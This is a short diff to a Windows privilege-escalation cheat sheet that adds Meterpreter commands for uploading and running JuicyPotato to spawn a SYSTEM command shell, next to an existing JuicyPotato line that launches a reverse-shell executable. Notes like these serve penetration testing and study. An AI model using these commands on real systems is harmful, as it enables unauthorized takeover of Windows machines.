@@ -577,6 +577,14 @@ If the CLSID ({03ca…) doesn’t work for you, either check this list: https://
 ```
 C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
 ```
+ 
+```
+#MSFCONSOLE
+mkdir /temp
+cd /temp
+upload JuicyPotato.exe 
+execute -f JuicyPotato.exe -a '-t u -p "C:\Windows\System32\cmd.exe" -l 4444' -i
+```
 
 ### Rogue potato
 - https://github.com/antonioCoco/RoguePotato
